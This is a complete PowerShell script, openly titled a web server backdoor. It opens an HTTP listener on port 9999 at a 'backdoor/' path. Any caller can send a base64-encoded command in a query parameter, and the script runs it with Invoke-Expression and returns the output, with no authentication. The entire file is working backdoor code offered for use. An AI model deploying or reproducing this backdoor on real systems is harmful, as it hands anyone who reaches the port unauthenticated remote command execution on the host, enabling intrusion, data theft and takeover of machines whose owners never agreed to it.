#Simple Powershell Web Server Backdoor
#Created by Chris Davis
$Port = "9999"
$Path = "backdoor/"
$Url = "http://*:$Port/$Path"
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add($Url)
$listener.Start()
try
{
  while ($listener.IsListening) {  
    $context = $listener.GetContext()
    $Request = $context.Request
    $Response = $context.Response
	$IPaddr = $Request.RemoteEndPoint.ToString().split('{:}')[0]
	$usage = "Usage:`n`nhttp://"+$IPaddr+":"+$Port+"/"+$Path+"`?cmd=<Insert Your powershell compatible base64 encoded command here>"
	try{
		$command = $Request.QueryString.Item("cmd")
		if ($command -eq "exit") {
			Write-Verbose "Now Exiting"
			return
		} elseif ($command.length -eq 0) {
			$html = $usage
		} else {
			$command =  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( $command ))
			try {
				$html = iex($command) | Out-String
				$Bytes = [System.Text.Encoding]::Unicode.GetBytes($html)
				$html =[Convert]::ToBase64String($Bytes)
			} catch {
				$html = "Error Processing Command."
				$statusCode = 500
			}
		}
	} catch {
		$html = $usage
	}
    $buffer = [Text.Encoding]::UTF8.GetBytes($html)
    $Response.ContentLength64 = $buffer.length
    $Response.OutputStream.Write($buffer, 0, $buffer.length)
    $Response.Close()
  }
}
finally
{
  $listener.Stop()
}
